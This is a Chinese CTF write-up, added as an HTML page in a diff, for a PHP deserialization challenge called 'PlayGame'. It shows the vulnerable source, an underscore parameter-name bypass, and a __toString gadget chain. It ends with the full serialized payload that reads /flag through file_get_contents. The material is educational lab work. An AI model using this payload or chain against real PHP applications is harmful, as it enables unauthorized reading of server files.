@@ -1,0 +1,79 @@
+<h1 id="toString-方法例题"><a href="#toString-方法例题" class="headerlink" title="__toString()方法例题"></a>__toString()方法例题</h1><h1 id="WEB-PlayGame"><a href="#WEB-PlayGame" class="headerlink" title="WEB-PlayGame"></a>WEB-PlayGame</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>打开题目显示题目源码如下，分析可知考察<code>php</code>反序列化的内容。</p>
+<p><img src="/assets/image-20231017093729141-20231022091951-huhz4dx.png"></p>
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>将源码粘贴的到<code>Phpstorm</code>中：</p>
+<pre><code class="php">&lt;?php
+/*
+PolarD&amp;N CTF
+*/
+class User{
+    public $name;
+    public $age;
+    public $sex;
+
+    public function __toString()
+    {
+        return &quot;name:&quot;.$this-&gt;name.&quot;age:&quot;.$this-&gt;age.&quot;sex:&quot;.$this-&gt;sex;
+    }
+    public function setName($name){
+        $this-&gt;name=$name;
+    }
+    public function setAge($age){
+        $this-&gt;$age=$age;
+    }
+    public function setSex($sex){
+        $this-&gt;$sex=$sex;
+    }
+}
+class PlayGame{
+    public $user;
+    public $gameFile=&quot;./game&quot;;
+    public function openGame(){
+        return file_get_contents($this-&gt;gameFile);
+    }
+    public function __destruct()
+    {
+        echo $this-&gt;user-&gt;name.&quot;GameOver!&quot;;
+    }
+    public function __toString(){
+        return $this-&gt;user-&gt;name.&quot;PlayGame &quot;. $this-&gt;user-&gt;age . $this-&gt;openGame();
+    }
+}
+if(isset($_GET[&#39;polar_flag.flag&#39;])){
+    unserialize($_GET[&#39;polar_flag.flag&#39;]);
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>可以看到题目传参处的参数为<code>polar_flag.flag</code>这边考察当参数存在<code>_</code>时的绕过操作，只需要将参数<code>polar_flag.flag</code>改为<code>polar[flag.flag</code>即可绕过，同时定位到反序列化入口类为<code>PlayGame</code>。</p>
+<pre><code class="php">public function __destruct()
+{
+    echo $this-&gt;user-&gt;name.&quot;GameOver!&quot;;
+}
+</code></pre>
+<p>根据<code>__destruct()</code>函数内容可知当<code>user</code>为<code>User</code>类时<code>echo</code>会触发<code>User</code>类的<code>__toString()</code>方法。</p>
+<pre><code class="php">public function __toString()
+{
+    return &quot;name:&quot;.$this-&gt;name.&quot;age:&quot;.$this-&gt;age.&quot;sex:&quot;.$this-&gt;sex;
+}
+</code></pre>
+<p>而<code>User</code>类的<code>__toString()</code>方法进行了字符串拼接，当<code>User</code>类的<code>name</code>参数为<code>PlayGame</code>类时则会触发<code>PlayGame</code>类的<code>__toString()</code>方法。</p>
+<pre><code class="php">public function openGame(){
+    return file_get_contents($this-&gt;gameFile);
+}
+public function __toString(){
+    return $this-&gt;user-&gt;name.&quot;PlayGame &quot;. $this-&gt;user-&gt;age . $this-&gt;openGame();
+}
+</code></pre>
+<p>在<code>PlayGame</code>类的<code>__toString()</code>方法中调用了<code>openGame()</code>函数而<code>openGame</code>函数中存在任意文件读取。</p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>生成序列化字符串，构造如下：</p>
+<pre><code class="php">$a = new PlayGame();
+$b = new User();
+$a-&gt;user=$b;
+$c = new PlayGame();
+$c-&gt;gameFile=&quot;/flag&quot;;
+$a-&gt;user-&gt;name=$c;
+echo serialize($a);
+//payload : O:8:&quot;PlayGame&quot;:2:{s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:{s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:{s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;}s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;}s:8:&quot;gameFile&quot;;s:6:&quot;./game&quot;;}
+</code></pre>
+<p>Get传参<code>?polar[flag.flag=O:8:&quot;PlayGame&quot;:2:{s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:{s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:{s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;}s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;}s:8:&quot;gameFile&quot;;s:6:&quot;./game&quot;;}</code>，查看源码即可拿到<code>flag</code></p>
+<p><img src="/assets/image-20231017095304736-20231022091951-1zd6nph.png" alt="image-20231017095304736"></p>
